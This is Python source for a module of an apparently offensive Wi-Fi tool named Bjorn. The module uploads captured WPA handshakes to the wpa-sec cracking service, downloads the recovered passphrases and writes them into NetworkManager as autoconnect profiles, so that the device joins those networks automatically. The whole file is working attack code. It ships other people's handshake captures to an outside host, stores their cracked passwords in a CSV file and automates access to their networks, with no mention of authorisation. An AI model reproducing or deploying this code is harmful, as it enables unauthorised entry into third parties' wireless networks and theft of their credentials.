"""wpasec_import.py - Standalone action (backlog Wave 1 #4 + Tier 1 #3).

Two-way wpa-sec loop:
  1. UPLOAD complete handshakes captured offline by the Handshake Hunter
     (bettercap_pwn) so the community can crack them.
  2. DOWNLOAD cracked credentials and inject them into NetworkManager as
     autoconnect profiles, so Bjorn can roam onto networks it already has the
     key for instead of blind-attacking them.

Opt-in: no-op unless `wpasec_api_key` is set. Needs internet + nmcli for the
download half; upload is best-effort (returns 'skipped' on network error).
Throttled to one pass per `wpasec_interval` seconds.
"""
import os
import re
import csv
import uuid
import time
import json
import logging
import shutil
import tempfile
import subprocess
import urllib.request
import urllib.error
from shared import SharedData
from logger import Logger
from csv_safe import sanitize_row

logger = Logger(name="wpasec_import.py", level=logging.INFO)

b_class = "WpaSecImport"
b_module = "wpasec_import"
b_status = "wpasec_import"
b_port = 0  # standalone action
b_needs_internet = True

WPASEC_DOWNLOAD_URL = "https://wpa-sec.stanev.org/?api&dl=1"
WPASEC_UPLOAD_URL = "https://wpa-sec.stanev.org/?api"
NM_DIR = "/etc/NetworkManager/system-connections"


class WpaSecImport:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self._last_fetch = 0.0
        self.recordfile = os.path.join(shared_data.crackedpwddir, "wifi_wpasec.csv")
        # Injectable for tests (same pattern as bettercap_pwn.can_start).
        self._urlopen = urllib.request.urlopen
        self._which = shutil.which
        self._spawn = subprocess.run
        logger.info("WpaSecImport initialized.")

    def execute(self):
        try:
            api_key = (getattr(self.shared_data, "wpasec_api_key", "") or "").strip()
            if not api_key:
                logger.info("wpasec_api_key not set; skipping wpa-sec import.")
                return 'skipped'

            interval = getattr(self.shared_data, "wpasec_interval", 3600)
            now = time.time()
            if interval and (now - self._last_fetch) < interval:
                return 'skipped'
            self._last_fetch = now

            # --- Upload half (#3): close the handshake→crack loop ---
            uploaded = self._upload_pending(api_key)

            # --- Download half: pull cracked keys, inject NM profiles ---
            text = self._fetch(api_key)
            if text is None and uploaded == 0:
                return 'skipped'

            injected = 0
            if text is not None:
                pairs = self._parse_potfile(text)
                known = self._known_ssids()
                for ssid, psk in pairs:
                    if ssid in known:
                        continue
                    if self._inject(ssid, psk):
                        self._record(ssid, psk)
                        known.add(ssid)
                        injected += 1

                if injected:
                    try:
                        subprocess.run(
                            ["nmcli", "connection", "reload"],
                            capture_output=True, timeout=15,
                        )
                    except Exception:
                        pass
                    logger.success(f"wpa-sec: injected {injected} new network profile(s)")

            if uploaded or injected:
                return 'success'
            return 'skipped'
        except Exception as e:
            logger.error(f"WpaSecImport failed: {e}")
            return 'failed'

    # ------------------------------------------------------------------ upload

    def _handshakes_base(self):
        return (
            getattr(self.shared_data, "handshakes_dir", None)
            or os.path.join("data", "output", "handshakes")
        )

    def _load_index(self):
        path = os.path.join(self._handshakes_base(), "index.json")
        try:
            with open(path) as f:
                data = json.load(f)
            entries = data.get("captures") if isinstance(data, dict) else None
            return entries if isinstance(entries, dict) else {}
        except (OSError, json.JSONDecodeError):
            return {}

    def _save_index(self, entries):
        base = self._handshakes_base()
        os.makedirs(base, exist_ok=True)
        path = os.path.join(base, "index.json")
        summary = {
            "captures": len(entries),
            "unique_bssids": len({e.get("bssid") for e in entries.values() if e.get("bssid")}),
            "bytes": sum(int(e.get("bytes") or 0) for e in entries.values()),
        }
        payload = {
            "version": 1,
            "updated": time.strftime("%Y-%m-%dT%H:%M:%S"),
            **summary,
            "captures": entries,
        }
        fd, tmp = tempfile.mkstemp(dir=base, prefix=".index-", suffix=".json")
        try:
            with os.fdopen(fd, "w") as f:
                json.dump(payload, f, indent=2)
            os.replace(tmp, path)
        except Exception:
            try:
                os.unlink(tmp)
            except OSError:
                pass
            raise

    def _is_complete(self, pcap_path):
        """True if the capture contains a real EAPOL/PMKID handshake.

        Uses hcxpcapngtool when available. Non-empty hc22000 output = complete.
        If the tool is missing, return False and log — never upload speculative noise.
        """
        tool = self._which("hcxpcapngtool")
        if not tool:
            logger.info(
                "hcxpcapngtool not installed; skipping completeness gate "
                "(and therefore upload) for this pass"
            )
            return False
        out = None
        try:
            fd, out = tempfile.mkstemp(suffix=".hc22000")
            os.close(fd)
            self._spawn([tool, "-o", out, pcap_path], capture_output=True, timeout=60)
            size = os.path.getsize(out) if os.path.exists(out) else 0
            return size > 0
        except Exception as e:
            logger.warning(f"hcxpcapngtool failed on {pcap_path}: {e}")
            return False
        finally:
            if out:
                try:
                    os.unlink(out)
                except OSError:
                    pass

    def _upload_file(self, api_key, pcap_path):
        """POST one capture to wpa-sec. Returns True on HTTP success."""
        boundary = "----bjorn%s" % uuid.uuid4().hex
        filename = os.path.basename(pcap_path)
        try:
            with open(pcap_path, "rb") as f:
                body_file = f.read()
        except OSError as e:
            logger.error(f"Cannot read capture {pcap_path}: {e}")
            return False

        parts = []
        parts.append(("--%s\r\n" % boundary).encode())
        parts.append(
            (
                'Content-Disposition: form-data; name="file"; filename="%s"\r\n'
                "Content-Type: application/octet-stream\r\n\r\n" % filename
            ).encode()
        )
        parts.append(body_file)
        parts.append(("\r\n--%s--\r\n" % boundary).encode())
        body = b"".join(parts)

        req = urllib.request.Request(
            WPASEC_UPLOAD_URL,
            data=body,
            headers={
                "Cookie": "key=%s" % api_key,
                "Content-Type": "multipart/form-data; boundary=%s" % boundary,
            },
            method="POST",
        )
        try:
            with self._urlopen(req, timeout=60) as resp:
                resp.read()
                status = getattr(resp, "status", 200)
            return 200 <= status < 300
        except urllib.error.HTTPError as e:
            logger.warning(f"wpa-sec upload HTTP {e.code} for {filename}")
            return False
        except Exception as e:
            logger.warning(f"wpa-sec upload failed for {filename}: {e}")
            return False

    def _upload_pending(self, api_key):
        """Upload every complete, not-yet-uploaded capture. Returns count uploaded.

        Dedupe by BSSID among complete captures: once any complete capture of an AP
        has been uploaded, siblings of that BSSID are marked uploaded too.
        """
        entries = self._load_index()
        if not entries:
            return 0

        done_bssids = {
            e.get("bssid") for e in entries.values()
            if e.get("uploaded") and e.get("bssid")
        }
        uploaded_count = 0
        dirty = False

        for path, entry in list(entries.items()):
            if entry.get("uploaded"):
                continue
            if not os.path.isfile(path):
                continue
            bssid = entry.get("bssid") or ""

            if entry.get("complete") is not True:
                complete = self._is_complete(path)
                entry["complete"] = complete
                dirty = True
                if not complete:
                    continue

            if bssid and bssid in done_bssids:
                entry["uploaded"] = time.strftime("%Y-%m-%dT%H:%M:%S")
                dirty = True
                continue

            if self._upload_file(api_key, path):
                stamp = time.strftime("%Y-%m-%dT%H:%M:%S")
                entry["uploaded"] = stamp
                if bssid:
                    done_bssids.add(bssid)
                uploaded_count += 1
                dirty = True
                logger.success(
                    f"wpa-sec: uploaded {os.path.basename(path)} (BSSID {bssid or '?'})"
                )

        if dirty:
            try:
                self._save_index(entries)
            except Exception as e:
                logger.error(f"Failed to persist handshake index after upload: {e}")

        if uploaded_count:
            logger.info(f"wpa-sec: uploaded {uploaded_count} complete capture(s)")
        return uploaded_count

    # ------------------------------------------------------------------ download

    def _fetch(self, api_key):
        try:
            req = urllib.request.Request(
                WPASEC_DOWNLOAD_URL,
                headers={"Cookie": "key=%s" % api_key},
            )
            with self._urlopen(req, timeout=30) as resp:
                return resp.read().decode("utf-8", errors="replace")
        except Exception as e:
            logger.warning(f"wpa-sec download failed: {e}")
            return None

    @staticmethod
    def _parse_potfile(text):
        pairs = []
        seen = set()
        for line in (text or "").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split(":", 3)
            if len(parts) != 4:
                continue
            _apmac, _stmac, essid, password = parts
            if not essid or not password:
                continue
            if any(ord(c) < 32 for c in essid + password):
                continue
            key = (essid, password)
            if key in seen:
                continue
            seen.add(key)
            pairs.append((essid, password))
        return pairs

    @staticmethod
    def _safe_conn_name(ssid):
        return "wpasec-" + re.sub(r"[^A-Za-z0-9_-]", "_", ssid)[:48]

    @staticmethod
    def _nmconnection(ssid, psk):
        """NM keyfile for one cracked network. autoconnect-priority is negative so these never
        outrank Bjorn's own `preconfigured` connection (priority 0) — it only falls back to a
        cracked network when its normal one isn't in range."""
        name = WpaSecImport._safe_conn_name(ssid)
        return (
            "[connection]\n"
            "id=%s\n"
            "uuid=%s\n"
            "type=wifi\n"
            "autoconnect=true\n"
            "autoconnect-priority=-10\n"
            "\n"
            "[wifi]\n"
            "mode=infrastructure\n"
            "ssid=%s\n"
            "\n"
            "[wifi-security]\n"
            "key-mgmt=wpa-psk\n"
            "psk=%s\n"
            "\n"
            "[ipv4]\n"
            "method=auto\n"
            "\n"
            "[ipv6]\n"
            "method=auto\n"
        ) % (name, uuid.uuid4(), ssid, psk)

    def _inject(self, ssid, psk):
        try:
            # Deterministic filename so re-injecting the same SSID overwrites, not accumulates.
            path = os.path.join(NM_DIR, self._safe_conn_name(ssid) + ".nmconnection")
            with open(path, "w") as f:
                f.write(self._nmconnection(ssid, psk))
            os.chmod(path, 0o600)  # NM refuses to load a world-readable keyfile
            return True
        except Exception as e:
            logger.error(f"Failed to inject NM profile for {ssid!r}: {e}")
            return False

    def _known_ssids(self):
        known = set()
        if os.path.exists(self.recordfile):
            try:
                with open(self.recordfile, newline="", encoding="utf-8", errors="replace") as f:
                    for row in csv.DictReader(f):
                        if row.get("SSID"):
                            known.add(row["SSID"])
            except Exception:
                pass
        try:
            out = subprocess.check_output(
                ["nmcli", "-t", "-f", "NAME", "connection", "show"],
                text=True, timeout=10,
            )
            for line in out.splitlines():
                if line.strip():
                    known.add(line.strip())
        except Exception:
            pass
        return known

    def _record(self, ssid, psk):
        os.makedirs(os.path.dirname(self.recordfile), exist_ok=True)
        write_header = not os.path.exists(self.recordfile)
        with open(self.recordfile, "a", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            if write_header:
                writer.writerow(["SSID", "Password", "Source", "Timestamp"])
            writer.writerow(sanitize_row([
                ssid, psk, "wpa-sec",
                time.strftime("%Y-%m-%dT%H:%M:%S"),
            ]))


if __name__ == "__main__":
    shared_data = SharedData()
    WpaSecImport(shared_data).execute()
